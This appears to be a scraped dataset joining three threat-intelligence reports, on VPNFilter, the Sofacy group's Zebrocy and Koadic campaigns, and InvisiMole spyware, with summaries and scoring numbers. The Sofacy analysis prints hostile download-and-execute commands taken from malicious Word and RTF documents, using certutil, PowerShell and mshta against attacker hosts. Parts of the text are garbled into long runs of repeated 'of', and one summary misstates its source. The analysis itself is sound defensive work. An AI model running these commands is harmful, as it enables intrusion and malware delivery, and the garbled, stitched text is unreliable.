stage 2 deployment server, making this malware extremely robust and capable of dealing with unpredictable C2 infrastructure changes. The stage 2 malware, which does not persist through a reboot, possesses capabilities that we have come to expect in a workhorse intelligencecollection platform, such as file collection, command execution, data exfiltration and device management. However, some versions of stage 2 also possess a selfdestruct capability that overwrites a critical portion of the device's firmware and reboots the device, rendering it unusable. Based on the actor's demonstrated knowledge of these devices, and the existing capability in some stage 2 versions, we assess with high confidence that the actor could deploy this selfdestruct command to most devices that it controls, regardless of whether the command is built into the stage 2 malware. In addition, there are multiple stage 3 modules that serve as plugins for the stage 2 malware. These plugins provide stage 2 with additional functionality. As of this writing, we are aware of two plugin modules: a packet sniffer for collecting traffic that passes through the device, including theft of website credentials and monitoring of Modbus SCADA protocol The ITSecurity report summarizes the threat posed by the malware known as VPNFilter. This malware is capable of infecting a wide range of devices, including routers, networkattached storage (NAS) devices, and Internet of Things (IoT) devices. Once infected, the malware can be used to collect data from the infected devices, as well as to take control of the devices and use them for malicious purposes, such as launching cyberattacks. The malware can also be used to exfiltrate data from the infected devices. Additionally, the malware can be used to launch destructive attacks on the infected devices, rendering them unusable. The malware is capable of spreading to other devices connected to the infected device, making it a global threat. The malware has been observed to target devices in more than 100 countries. Additionally, the malware has been observed to target devices in Ukraine, with a majority of Ukrainian infections sharing a separate stage 2 C2 infrastructure from the rest of the world, on IP 46.151.209[.]33. Talos would like to thank the Cyber Threat Alliance (CTA) for their assistance in this matter. We recommend that users of SOHO routers and/or NAS devices reset them to factory defaults and reboot them in order to remove the potentially destructive, nonpersistent stage 2 and stage 3 malware. Internet service providers that provide SOHO routers to their users reboot the routers on their customers' behalf. If you have any of the devices known or suspected to be affected by this threat, it is extremely important that you work with the manufacturer to ensure that your device is up to date with the latest patch versions. If not, you should apply the updated patches immediately. The malware downloads an image from Photobucket, extracts the download server's IP address from the EXIF information of the image, and attempts to connect interactively to the device. If stage 1 fails to connect to, download an image from, or successfully acquire an IP address via an image from Photobucket, the malware reaches out to a backup domain, toknowall[. ]com, to download an image and attempt the same process. If the attempt to the backup domain fails, stage 1 opens a listener that waits for a specific trigger packet to open a connection for the actor to connect interactively to the device. When the listener opens, it checks its public IP from api.ipify[. ]org and stores it for later comparison. Then, when any packet arrives on any port, the listener performs a series of checks to identify a trigger packet. If the packet meets a predefined set of criteria, it will extract an IP address from the packet and attempt a stage 2 download. The stage 2 malware first sets up the working environment by creating a modules folder (/var/run/vpnfilterm) and a working directory (/var/run/vpnfilterw). Afterward, it will run in a loop, where it first reaches out to a C2 server, and then executes commands retrieved from the C2. The command names are encrypted with the same broken RC4 function as in stage 1. Fortunately, older versions of x86 stage 2 sample were very verbose, and debug printed all the steps it performed. Newer versions of the x86 stage 2 did not contain the debug prints, nor did the MIPS sample. The x86 sample can perform the following operations: kill: Overwrites the first 5,000 bytes of /dev/mtdblock0 with zeros, and reboots the device We have analyzed two plugin modules for the malware, a packet sniffer and a communication plugin that allows the malware to communicate over Tor. We assess with high confidence that there are likely several more that we have not yet discovered. Among the initial samples Talos acquired, there was a plugin for the MIPS stage 2, which is a packet sniffer. It intercepts all network traffic through a raw socket and looks for strings used in HTTP basic authentications. Further, it specifically tracks Modbus TCP/IP packets. The resulting log file is placed in the stage 2 working directory, /var/run/vpnfilterw. This allows the attackers to understand, capture, and track the traffic flowing through the device.The Tor plugin module is partially linked into stage 2, but has a separate Tor executable, which is downloaded to /var/run/tor and run in a process separate from stage 2. The Tor binary looks like the standard Tor client, in the form of a statically linked and stripped binary. of of of of of of of of of of of of of of of of [1. [sp [sp..... of of of of of of of of of............... of of of of of of of.... of of of of of of of of..... of of. of of. of................................................ of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of. of. of.............. of. of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of [ [ [ [ [ [ [ of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of of. of..1 of. of of of of of;en;{'r': 0.3096816976127321, 'p': 0.912109375, 'f': 0.4623762338393491};{'r': 0.25336927223719674, 'p': 0.8359683794466403, 'f': 0.3888761168622445};{'r': 0.30702917771883287, 'p': 0.904296875, 'f': 0.4584158377997451}
https://unit42.paloaltonetworks.com/unit42-sofacy-groups-parallel-attacks/;Sofacy Group’s Parallel Attacks;"This post is also available in: ??? (Japanese)SummaryThe Sofacy group remains a persistent global threat. Unit 42 and others have shown in the first half of 2018 how this threat actor group continues to target multiple organizations throughout the world with a strong emphasis on government, diplomatic and other strategic organizations primarily in North America and Europe.Following up our most recent Sofacy research in February and March of 2018 , we have found a new campaign that uses a lesser known tool widely attributed to the Sofacy group called Zebrocy. Zebrocy is delivered primarily via phishing attacks that contain malicious Microsoft Office documents with macros as well as simple executable file attachments. This third campaign is consistent with two previously reported attack campaigns in terms of targeting: the targets were government organizations dealing with foreign affairs. In this case however the targets were in different geopolitical regions.An interesting difference we found in this newest campaign was that the attacks using Zebrocy cast a far wider net within the target organization: the attackers sent phishing emails to a an exponentially larger number of individuals. The targeted individuals did not follow any significant pattern, and the email addresses were found easily using web search engines. This is a stark contrast with other attacks commonly associated with the Sofacy group where generally no more than a handful of victims are targeted within a single organization in a focus-fire style of attack.In addition to the large number of Zebrocy attacks we discovered, we also observed instances of the Sofacy group leveraging the Dynamic Data Exchange (DDE) exploit technique previously documented by McAfee. The instances we observed, however, used the DDE exploit to deliver different payloads than what was observed previously. In one instance the DDE attack was used to deliver and install Zebrocy. In another instance, the DDE attack was used to deliver an open-source penetration testing toolkit called Koadic. The Sofacy group has leveraged open source or freely available tools and exploits in the past but this is the first time that Unit 42 has observed them leveraging the Koadic toolkit.Links to previous attacksIn our February report, we discovered the Sofacy group using Microsoft Office documents with malicious macros to deliver the SofacyCarberp payload to multiple government entities. In that report, we documented our observation that the Sofacy group appeared to use conventional obfuscation techniques to mask their infrastructure attribution by using random registrant and service provider information for each of their attacks. In particular, we noted that the Sofacy group deployed a webpage on each of the domains. This is odd because attackers almost never set up an actual webpage on adversary C2 infrastructure. Even stranger, each webpage contained the same content within the body. Since that report, we continued our research into this oddity. Using this artifact, we were able to pivot and discover another attack campaign using the DealersChoice exploit kit with similar victimology to what we saw in February. Continuing to use this artifact, we discovered another domain with the same content body, supservermgr[.]com. This domain was registered on December 20, 2017 and within a few days was resolving to 92.222.136[.]105, which belonged to a well-known VPS provider often used by the Sofacy group.Unfortunately, at the time of collection, the C2 domain had been sinkholed by a third party. Based on dynamic and static analysis of the malware sample associated with the supservermgr[.]com domain however, we were able to determine several unique artifacts which allowed us to expand our dataset and discover additional findings. First, we determined the sample we collected, d697160ae... was attempting to communicate to its C2 at hxxp://supservermgr[.]com/sys/upd/pageupd.php to retrieve a Zebrocy AutoIT downloader. Because the domain had been sinkholed, this activity could not be completed. However, we were able determine a unique, hard-coded user agent used for the C2 communications:Mozilla/4.0 (compatible, MSIE 6.0, Windows NT 5.1, SV1, .NET CLR 1.1.4322, .NET CLR 2.0.50727, .NET CLR 3.0.04506.30, .NET CLR 3.0.04506.648, InfoPath.1)Using AutoFocus, we pivoted from the user agent string to expand our data set to three additional Zebrocy samples using the exact same user agent. This led us to additional infrastructure for Zebrocy at 185.25.51[.]198 and 185.25.50[.]93. At this point we had collected nearly thirty samples of Zebrocy in relation to the original sample and its associated C2 domain. Additional pivoting based on artifacts unique to this malware family expanded our dataset to hundreds of samples used over the last several years. Most of the additional samples were the Delphi and AutoIT variants as reported by ESET. However, several of the collected samples were a C++ variant of the Zebrocy downloader tool. In addition, we discovered evidence of a completely different payload in Koadic being delivered as well. Also, we found the IP address 185.25.50[.]93 hosting C2 services for a Delphi backdoor that ESET's report states is the final stage payload for these attacks.A Maltego chart diagramming the relational analysis we performed is below:Figure 1 Visualization of relationshipsPlease note this is not a comprehensive chart of all Zebrocy and Koadic samples we were able to collect. Only samples mentioned or relevant to the relational analysis have been included.From the 185.25.50[.]93 C2 IP, we discovered another hard-coded user agent being used by Zebrocy:Mozilla/5.0 (Windows NT 6.1, WOW64) WinHttp/1.6.3.8 (WinHTTP/5.1) like GeckoWe observed several samples of Zebrocy using this user agent targeting the foreign affairs ministry of a large Central Asian nation. Pivoting off of this artifact provided us additional Zebrocy samples. One sample in particular, cba5ab65a... used yet another unique user agent string in combination with the previous user agent for its C2:Mozilla v5.1 (Windows NT 6.1, rv:6.0.1) Gecko/20100101 Firefox/6.0.1A malware sample using two separate unique user agent strings is uncommon. A closer examination of the tool revealed the second user agent string was from a secondary payload that was retrieved by the cba5ab65a... sample. Pivoting from the Mozilla v5.1 user agent revealed over forty additional Zebrocy samples, with several again targeting the same Central Asian nation. Two samples specifically, 25f0d1cbc... and 115fd8c61... provided additional artifacts we were able to pivot from to discover weaponized documents to deliver Zebrocy as well as a Koadic.Examining the use of the unique user agents' strings over time shows that while previously only the Mozilla/5.0 user agent was in use, since mid 2017 all three user agent strings have been used by the Zebrocy tool for its C2 communications.Figure 2 Timeline of User AgentsDDE DocumentsThe two weaponized documents we discovered leveraging DDE were of particular interest due to victimology and a change in tactics.While examining 25f0d1cbc..., we were able to pivot from its C2 220.158.216[.]127 to gather additional Zebrocy samples as well as a weaponized document. This document (85da72c7d...) appears to have been targeting a North American government organization dealing with foreign affairs. It leveraged DDE to retrieve and install a payload onto the victim host. A decoy document is deployed in this attack, with the contents purporting be a publicly available document from the United Nations regarding the Republic of Uzbekistan.Figure 3 Example of delivery documentFigure 4 Lure image usedThe creator of the weaponized document appended their DDE instructions to the end of the document after all of the decoy contents. When the document is opened in Word, the instructions are not immediately visible, as Word does not display these fields contents by default. As you can see in the following screenshot, simply attempting to highlight the lines in which the DDE instructions reside does not display them.Figure 5 Hidden DDE commandsEnabling the ""Toggle Field Codes"" feature reveals the DDE instructions to us and shows that the author had set instructions to size 1 font and with a white coloring. The use of a white font coloring to hide contents within a weaponized document is a technique we had previously reported being used by the Sofacy group in a malicious macro attack.The DDE instructions attempt to run the following the following command on the victim host, which attempts to download and execute a payload from a remote server:C:\\Programs\\Microsoft\\MSOffice\\Word.exe\\..\\..\\..\\..\\Windows\\ System32\\rundll32.exe C:\\Windows\\System32\\shell32.dll,ShellExec_RunDLL C:\\Windows\\System32\\cmd.exe /k certutil -urlcache -split -f hxxp://220.158.216[.]127/MScertificate.exe & MScertificate.exe"" 1 2 3 4 5 C : \ \ Programs \ \ Microsoft \ \ MSOffice \ \ Word . exe \ \ . . \ \ . . \ \ . . \ \ . . \ \ Windows \ \ System32 \ \ rundll32 . exe C : \ \ Windows \ \ System32 \ \ shell32 . dll , ShellExec _ RunDLL C : \ \ Windows \ \ System32 \ \ cmd . exe / k certutil - urlcache - split - f hxxp : //220.158.216[.]127/MScertificate.exe & MScertificate.exe""During our analysis, we observed this DDE downloading and executing a Zebrocy AutoIt downloader (f27836430...), configured to attempt to download an additional payload from 220.158.216[.]127. The DDE instructions also included another command that it did not run, which suggests it is an artifact of a prior version of this delivery document. The following shows this unused command, which exposed an additional server within Sofacy's infrastructure would download and execute an encoded PowerShell script from 92.114.92[.]102:C:\\Programs\\Microsoft\\MSOffice\\Word.exe\\..\\..\\..\\..\\Windows\\ System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -sta -NonI -W hidden $e=(New-Object System.Net.webClient).downloadString('hxxp://92.114.92[.]102:80/d'),po wershell -enc $e  1 2 3 4 5 C : \ \ Programs \ \ Microsoft \ \ MSOffice \ \ Word . exe \ \ . . \ \ . . \ \ . . \ \ . . \ \ Windows \ \ System32 \ \ WindowsPowerShell \ \ v1 . 0 \ \ powershell . exe - NoP - sta - NonI - W hidden $ e = ( New - Object System . Net . webClient ) . downloadString ( 'hxxp://92.114.92[.]102:80/d' ) , po wershell - enc $ e The unused command above appears to be related to previous attacks, specifically attacks that occurred in November 2017 as discussed by McAfee and ESET . The payload delivered in these November 2017 attacks using DDE enabled documents was SofacyCarberp, which differs from the Zebrocy downloader delivered in the February 2018 attacks.115fd8c61... was another Zebrocy sample we were able to pivot from by gathering additional samples connecting to its C2 86.106.131[.]177. The additional samples targeted the same large Central Asian nation state as previously mentioned but more interestingly, one of the samples was a weaponized document also leveraging DDE and containing a non-Zebrocy payload. The payload turned out to be an open source penetration test toolkit called Koadic. It is a toolkit similar to Metasploit or PowerShell Empire and is freely available to anyone on Github.Figure 6 Example of delivery documentThe RTF document (8cf3bc2bf...) was very small in size at 264 bytes, which can be seen in its entirety here:{\rtf1{\field{\*\fldinst DDEAUTO ""C:\\\\WIndowS\\\\SYsTem32\\\\cMD.eXe "" ""/C POWErsHELl.eXE -ex BypaSs -NOP -w HIdDen (NEw- oBjeCT SyStEm.NET.weBCLiENT).dowNloADFILe( 'hxxp://86.106.131[.]177/link/GRAPH.EXE' , '%apPDAtA%\graph.exe' ) , saps '%Appdata%\graph.exe'""}}} 1 2 3 4 5 6 { \ rtf1 { \ field { \ * \ fldinst DDEAUTO ""C:\\\\WIndowS\\\\SYsTem32\\\\cMD.eXe "" ""/C POWErsHELl.eXE -ex BypaSs -NOP -w HIdDen (NEw- oBjeCT SyStEm.NET.weBCLiENT).dowNloADFILe( 'hxxp://86.106.131[.]177/link/GRAPH.EXE' , '%apPDAtA%\graph.exe' ) , saps '%Appdata%\graph.exe'"" } } }The contents above use the DDE functionality in Microsoft Word to run a PowerShell script to download the Koadic payload from a remote server, save it as an executable file on the system and then execute the payload.ConclusionThe Sofacy group continues their targeted attack campaigns in 2018. As mentioned in this blog, Sofacy is carrying out parallel campaigns to attack similar targets around the world but with different toolsets. The Zebrocy tool associated with this current strain of attacks is constructed in several different forms based on the programming language the developer chose to create the tool. We have observed Delphi, AutoIt, and C++ variants of Zebrocy, all of which are related not only in their functionality, but also at times by chaining the variants together in a single attack. These attacks are still largely perpetrated via spear phishing campaigns, whether via simple executable attachments in hopes that a victim will launch the file to using a previously observed DDE exploitation technique.Palo Alto Networks customers are protected from Zebrocy and Koadic attacks by:All known Zebrocy samples have a malicious verdict in WildFireAutoFocus customers can track this campaign with the following Tags: Zebrocy KoadicAppendixZebrocy C++ VariantOn February 19, 2018, we saw a spear phishing email sent to a foreign affairs organization within a Central Asian country, which attempted to delivered an attached Zebrocy downloader (5b5e80f63...) written in the Delphi programming language. This downloader obtained a second downloader, which in this case was very similar in functionality but was written in C++ instead of Delphi.This variation of the Zebrocy downloader begins by gathering the serial number for the storage volume with the label ""C:\"" and the computer name. It then creates an invisible window (0x0 pixel) in the bottom right corner of the screen, which will call the main function of the Trojan.The main function of the Trojan interacts with its configured C2 server to obtain additional code to execute. The main function gets pertinent strings to communicate with its C2 by calling a sub-function with a specific number that the sub-function uses as a case within a switch statement to decrypt the desired string. For instance, here are the resulting decrypted strings from each of the case statements (dd7e69e1...):Case - String decrypted1 - 185.25.50[.]932 - POST http://185.25.50[.]93/syshelp/kd8812u/protocol.php HTTP/1.1\rHost: 185.25.50[.]93\rContent-Type: application/x-www-form-urlencoded\rContent-Length:3 - porg=4 - Content-Length:The Trojan uses raw sockets to communicate with its C2 server and uses the decrypted string above to create HTTP requests. It starts by calling this specific sub-function with an argument of 1 to get the IP address for the C2 to connect. It then calls the subfunction with the argument of 2 to get the string that it will use as the HTTP POST request. The main function then calls the subfunction with the argument 3 to get the POST data parameter (""porg"") along with the volume serial number and computer name and will send this data to the C2 via the HTTP POST request. The resulting HTTP POST request looks like the following:POST http://185.25.50[.]93/syshelp/kd8812u/protocol.php HTTP/1.1Host: 185.25.50[.]93Content-Type: application/x-www-form-urlencodedContent-Length: 21porg=44908AE0524f422dWe have not seen a C2 server respond to our requests during our analysis, however, we do know how the Trojan will parse the C2's response for specific data.-1 - Deletes the buffer and exits the Trojan.009 - Deletes the buffers and exits the Trojan.If neither of the above values are found at the beginning of the HTTP response, the Trojan checks the C2 response for the ASCII representation of hexadecimal bytes. The Trojan will convert these hexadecimal bytes to their binary values and write them to a file and will run the file using the ""open"" function using the ShellExecuteW API function.We have seen the following HTTP POST parameters within the Zebrocy C++ samples:porgstructOneoqvolumeDDE DetailsThe author of the DDE document used in the February 2018 attacks used some obfuscation techniques in an attempt to evade detection. First, the DDE instructions heavily rely on the QUOTE field, which converts decimal values to their ASCII equivalent character. Also, the author capitalized the ""E"" in the ""dde"" command to evade case sensitive signatures. Lastly, the author bolded the ""dd"" characters within the ""dde"" command, which breaks the string up within the XML of the DOCX file (word/document.xml) to make signature development difficult, as seen here:<w:r w:rsidRPr=""00E84CED""> <w:rPr> <w:b/> <w:noProof/> <w:color w:themeColor=""background1"" w:val=""FFFFFF""/> <w:sz w:val=""2""/> <w:szCs w:val=""2""/> </w:rPr> <w:instrText>dd</w:instrText> </w:r> <w:r w:rsidRPr=""00E84CED""> <w:rPr> <w:color w:themeColor=""background1"" w:val=""FFFFFF""/> <w:sz w:val=""2""/> <w:szCs w:val=""2""/> </w:rPr> <w:instrText xml:space=""preserve"">E </w:instrText> </w:r> 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 < w : r w : rsidRPr = ""00E84CED"" > < w : rPr > < w : b / > < w : noProof / > < w : color w : themeColor = ""background1"" w : val = ""FFFFFF"" / > < w : sz w : val = ""2"" / > < w : szCs w : val = ""2"" / > < / w : rPr > < w : instrText > dd < / w : instrText > < / w : r > < w : r w : rsidRPr = ""00E84CED"" > < w : rPr > < w : color w : themeColor = ""background1"" w : val = ""FFFFFF"" / > < w : sz w : val = ""2"" / > < w : szCs w : val = ""2"" / > < / w : rPr > < w : instrText xml : space = ""preserve"" > E < / w : instrText > < / w : r >In addition to the aforementioned DOCX file, we found another related DDE enabled document based on an infrastructure overlap with a Zebrocy C2 IP address. This related delivery document was an RTF file that downloaded and installed a payload used to load the open-source Koadic tool. We do not have telemetry on the target or attack vector, but we know the RTF file used DDE to download and execute an executable that loaded Koadic.The payload (abbad7acd...) is an executable that appears to have been created by a VBScript to Executable tool and further obfuscated with a cryptor. Our analysis shows some possible ties to the Vbs to Exe tool by F2KO Software but we have yet to confirm a direct overlap. We believe the actor used a cryptor on the payload, as it obtains a filename and script from within its resources and decodes these resources by multiplying each byte by negative one. The payload then uses the MD5 hash (14331d289e737093994395d3fc412afc) of what appears to be a hardcoded SHA1 hash (B6A75B1EF701710D7AEADE0FE93DE8477F3BD506) as an RC4 key to decrypts the resulting decoded data. For instance, the following data exists within a resource:fb 70 b0 c9 bd c5 8a d4 0c 54 fd 4c 6d bb f0 0fBy multiplying each byte with -1, we obtain the following data:05 90 50 37 43 3b 76 2c f4 ac 03 b4 93 45 10 f1After using RC4 and the key 14331d289e737093994395d3fc412afc, the following cleartext data appears:\x00\x00\x00\x00FlashRun.vbsWe do not see the payload using this FlashRun.vbs filename, instead it uses a temporary file name to store an embedded VBScript file, such as %Temp%\4.tmp\5.vbs. The embedded VBScript is retrieved from a resource and decrypted using the same algorithm as discussed above, which results in the following cleartext:set objshell = createobject(\""wscript.shell\"") objshell.run \""mshta hxxp://86.106.131.177:6500/zIZFh\"",vbhide 1 2 set objshell = createobject ( \ "" wscript . shell \ "" ) objshell . run \ "" mshta hxxp : //86.106.131.177:6500/zIZFh\"",vbhideThe Koadic C2 server will respond to this request with Javascript code that acts as the Koadic staging payload, which allows the actor to run additional Koadic modules on the end system to carry out their post-exploitation activities. Unfortunately, we did not observe the Koadic modules used by Sofacy during out analysis.IOCsDomainsupservermgr[.]comURLhxxp://supservermgr[.]com/sys/upd/pageupd.phpZebrocyd697160aecf152a81a89a6b5a7d9e1b8b5e121724038c676157ac72f20364edccba5ab65a24be52214736bc1a5bc984953a9c15d0a3826d5b15e94036e5497df25f0d1cbcc53d8cfd6d848e12895ce376fbbfaf279be591774b28f70852a4fd8115fd8c619fa173622c7a1e84efdf6fed08a25d3ca3095404dcbd5ac3deb1f03f27836430742c9e014e1b080d89c47e43db299c2e00d0c0801a2830b41b57bc15b5e80f63c04402d0b282e95e32155b2f86cf604a6837853ab467111d4ac15e2dd7e69e14c88972ac173132b90b3f4bfb2d1faec15cca256a256dd3a12b6e75dKoadicabbad7acd50754f096fdc6551e728aa6054dcf8e55946f90a02b17db552471caUser AgentsMozilla/4.0 (compatible, MSIE 6.0, Windows NT 5.1, SV1, .NET CLR 1.1.4322, .NET CLR 2.0.50727, .NET CLR 3.0.04506.30, .NET CLR 3.0.04506.648, InfoPath.1)Mozilla/5.0 (Windows NT 6.1, WOW64) WinHttp/1.6.3.8 (WinHTTP/5.1) like GeckoMozilla v5.1 (Windows NT 6.1, rv:6.0.1) Gecko/20100101 Firefox/6.0.1IPs185.25.51[.]198185.25.50[.]93220.158.216[.]12792.114.92[.]10286.106.131[.]177DDE Docs85da72c7dbf5da543e10f3f806afd4ebf133f27b6af7859aded2c3a6eced2fd58cf3bc2bf36342e844e9c8108393562538a9af2a1011c80bb46416c0572c86ff";The Sofacy group remains a persistent global threat. Unit 42 and others have shown in the first half of 2018 how this threat actor group continues to target multiple organizations throughout the world with a strong emphasis on government, diplomatic and other strategic organizations primarily in North America and Europe. Following up our most recent Sofacy research in February and March of 2018 , we have found a new campaign that uses a lesser known tool widely attributed to the Sofacy group called Zebrocy. Zebrocy is delivered primarily via phishing attacks that contain malicious Microsoft Office documents with macros as well as simple executable file attachments. This third campaign is consistent with two previously reported attack campaigns in terms of targeting: the targets were in different geopolitical regions. An interesting difference we found in this newest campaign was that the attacks using Zebrocy cast a far wider net within the target organization: the attackers sent phishing emails to a an exponentially larger number of individuals. The targeted individuals did not follow any significant pattern, and the email addresses were found easily using web search engines. This is a stark contrast with other attacks commonly associated with the Sofacy group where generally no more than a handful of victims are targeted within a single organization in a focusfire style of attack. In addition to the large number of Zebrocy attacks we discovered, we also observed instances of the Sofacy group leveraging the Dynamic Data Exchange (DDE) exploit technique previously documented by McAfee. The instances we observed, however, used the DDE exploit to deliver and install Zebrocy. In one instance the DDE attack was used to deliver and install an opensource penetration testing toolkit called Koadic. The Sofacy group has leveraged open source or freely available tools and exploits in the past but this is the first time that Unit The;en;{'r': 0.16532618409294011, 'p': 0.9893048128342246, 'f': 0.2833078076535322};{'r': 0.1145374449339207, 'p': 0.9794520547945206, 'f': 0.20509142874558287};{'r': 0.16532618409294011, 'p': 0.9893048128342246, 'f': 0.2833078076535322}
https://www.welivesecurity.com/2018/06/07/invisimole-equipped-spyware-undercover/;InvisiMole: Surprisingly equipped spyware, undercover since 2013;"Hunting for secrets from high-profile targets while staying in the shadowsThis is the modus operandi of the two malicious components of InvisiMole. They turn the affected computer into a video camera, letting the attackers see and hear what's going on in the victim's office or wherever their device may be. Uninvited, InvisiMole's operators access the system, closely monitoring the victim's activities and stealing the victim's secrets.Our telemetry indicates that the malicious actors behind this malware have been active at least since 2013, yet the cyber-espionage tool was never analyzed nor detected until discovered by ESET products on compromised computers in Ukraine and Russia.The campaign is highly targeted - no wonder the malware has a low infection ratio, with only a few dozen computers being affected.InvisiMole has a modular architecture, starting its journey with a wrapper DLL, and performing its activities using two other modules that are embedded in its resources. Both of the modules are feature-rich backdoors, which together give it the ability to gather as much information about the target as possible.Extra measures are taken to avoid attracting the attention of the compromised user, enabling the malware to reside on the system for a longer period of time. How the spyware was spread to the infected machines is yet to be determined by further investigation. All infection vectors are possible, including installation facilitated by physical access to the machine.Installation and persistenceThe first part of the malware we are looking at is a wrapper DLL, compiled with the Free Pascal Compiler. From our telemetry, we have observed that this DLL is placed in the Windows folder, masquerading as a legitimate mpr.dll library file with a forged version info resource.We have not seen a wrapper DLL named differently, however, there are hints in the DLL code that it might be also named fxsst.dll or winmm.dll.The first way in which the malware can be launched is by hijacking a DLL. Being placed in the same folder as explorer.exe, the wrapper DLL is loaded during the Windows startup into the Windows Explorer process instead of the legitimate library located in the %windir%\system32 folder.We have found both 32-bit and 64-bit versions of the malware, which makes this persistence technique functional on both architectures.As an alternative to DLL hijacking, other loading and persistence methods are possible. The wrapper DLL exports a function called GetDataLength. When this function is called, the DLL checks whether it was loaded by the rundll32.exe process with either explorer.exe or svchost.exe as its parent process, and only then does it launch the payload. This suggests other possible persistence methods - by scheduling a task (i.e. having svchost.exe as a parent process) or by installation in a startup registry key (explorer.exe being the parent process).Regardless of the persistence method, the behavior of the malware and of the actual payload is the same in all cases. The wrapper DLL loads both the modules stored in its resources, named RC2FM and RC2CL, and (if DLL hijacking was used) finally loads the legitimate library into the explorer.exe process, in order not to disrupt the normal operation of the application, and thereby remain hidden.Technical analysisThe exact date when the malware was compiled is unknown - the recent wrapper DLL samples were tampered with by the malware authors, with the PE timestamps manually set to zero values. However, during our research, we found an earlier version of the malware with a PE timestamp reading Oct 13, 2013, so the compilation date of the later version is almost surely more recent.Encryption and decryptionTo increase its level of stealth, the malware protects itself from the eyes of administrators and analysts by encrypting its strings, internal files, configuration data and network communication. While the RC2FM module uses a handful of custom ciphers, the wrapper DLL and the RC2CL module share one particular routine for all purposes, especially for decrypting other malware modules embedded in the wrapper DLL.A script that is able to extract the embedded modules RC2FM and RC2CL from the wrapper DLL, using this routine, is available on ESET's malware-research GitHub repository.Module RC2FMThe first, smaller module RC2FM contains a backdoor with fifteen supported commands. These are executed on the affected computer when so instructed by the attackers. The module is designed to make various changes to the system but it also offers a bunch of spying commands.A logging option is implemented throughout the file but the name of the log file is not configured in the analyzed sample. This suggests that it was only used during the development of the malware.Network communicationThis module communicates with C&C servers that are either hardcoded in the sample, or updated later by the attackers.Moreover, the module is able to reach out to the C&C servers even if there is a proxy configured on the infected computer. If a direct connection is unsuccessful, the module attempts to connect to any of its C&C servers using locally-configured proxies or proxies configured for various browsers (Firefox, Pale Moon, and Opera).RC2FM can go as far as inspecting the recently executed applications list and look specifically for portable browser executables:FirefoxPortable.exeOperaPortable.exeRun waterfox.exeOperaAC.exePalemoon-Portable.exeShould the victim use one of these portable browsers with a proxy server configured, the malware can find that in the user's preferences and use that proxy to communicate with its C&C servers.C&C communication consists of a series of HTTP GET and POST requests, as shown in Figure 5. The encrypted request includes a PC identifier and timestamp, and optionally some other data. It is worth noting that the RC2FM module uses a number of encryption methods (variations of a simple XOR encryption routine), unlike the other InvisiMole parts.After successfully registering the victim with the C&C server, additional data are downloaded, which are to be interpreted on the local computer as backdoor commands.CapabilitiesRC2FM supports commands for listing basic system information and performing simple changes on the system, but also includes a few spyware features. When required by the attacker, it is capable of remotely activating the microphone on the compromised computer and capturing sounds. The audio recordings are encoded to MP3 format using a legitimate lame.dll library, which is downloaded and misused by the malware.Another way in which the malware can interfere with the victim's privacy is by taking screenshots, which is another of the backdoor commands.The malware also monitors all fixed and removable drives mapped on the local system. Whenever a new drive is inserted, it creates a list of all the files on the drive and stores it encrypted in a file.All of the collected data can ultimately be sent to the attackers, when the appropriate command is issued.Backdoor commandsFifteen commands are supported, as listed below. The backdoor interpreter function is visualized in Figure 6.Command ID Command description 0 List information about mapped drives, list files in a folder, list network shares 2 Create, move, rename, execute or delete a file, delete a directory using the specified path 4 Open a file, set the file pointer to the file beginning 5 Close a previously opened file 6 Write data into a previously opened file 7 Modify file times / delete a file 8 Open a file, set the file pointer to the end of the file 10 Modify file times / delete a file 12 Search files by supplied file mask in a specified directory 13 Take a screenshot 14 Upload or modify files with internal data 15 Record sound using input audio devices, list available devices, send recordings, change configuration 16 Check whether this module currently has any files open 17 Update list of C&C servers 19 Create, set, copy, enumerate or delete the specified registry keys or valuesModule RC2CLThe RC2CL module is also a backdoor with extensive spying capabilities. It is started by the wrapper DLL, launched at the same time as the RC2FM module. This one is more complex and offers features for collecting as much data about the infected computer as possible, rather than for making system changes.Interestingly, there is an option in the RC2CL module to turn off its backdoor functionality and act as a proxy. In this case, the malware turns off the Windows firewall and creates a server that relays communication between a client and C&C server, or between two clients.Network communicationThe malware communicates with its C&C servers through a TCP socket. Messages sent from a client mimic the HTTP protocol, but note the invalid ""HIDE"" HTTP verb in the example in Figure 7.These requests comprise an identifier of the compromised PC, the request type, and encrypted data that are to be sent to the attackers, i.e. the results of the backdoor commands or appeals for further instructions.CapabilitiesDepending on the commands received, the backdoor can perform various actions on the infected computer. Common backdoors often support commands such as file system operations, file execution, registry key manipulation or remote shell activation. This spyware supports all of these instructions and a whole lot more - its 84 commands provide the attackers with all they need to look at their victims more closely.The malware can inspect the infected computer and provide various data, from system information such as lists of active processes, running services, loaded drivers or available drives, to networking information, including the IP forward table and the speed of the internet connection.InvisiMole is capable of scanning enabled wireless networks on the compromised system. It records information such as the SSID and MAC address of the visible Wi-Fi access points. These data can then be compared to public databases, letting the attackers track the geolocation of the victim.Other commands can provide information about the users of the compromised machine, their accounts and previous sessions.The software installed on the compromised computer is of particular interest. Which programs are installed on the system? Which of them are executed automatically at each system start or user logon? Which programs are used by a particular user? If the attackers are interested, they are only one command away from these valuable data.The malware can be instructed to search for recently-used documents or other interesting files. It can monitor specific directories and removable devices, report any changes and exfiltrate files of the attackers' choice.The malware may enable or disable the User Account Control (UAC), or even bypass the UAC and work with the files in secure locations without having administrator privileges (see more at https://wikileaks.org/ciav7p1/cms/page_3375231.html). If the malware is running under the explorer.exe process, which is auto-elevated, it can create an elevated COM object and use it to delete or move files in locations that require admin rights.What is even more disturbing is that it can remotely activate the victim's webcam and microphone and spy on the victim by taking pictures and recording sound. Screen activity can be monitored by capturing screenshots. What is particularly interesting about InvisiMole is that not only are the usual ""whole display"" screenshots taken - it can separately capture each window, which helps the attackers gain more information even when the windows are overlapped.Further, one of the backdoor commands is used to replace the contents of drivers with the following names:blbdrive.syscompbatt.syssecdrv.sysWe have not observed the attackers actually using this command but we can speculate that it does so to achieve additional persistence on 32-bit systems.Though the backdoor is capable of interfering with the system (e.g. to log off a user, terminate a process or shut down the system), it mostly provides passive 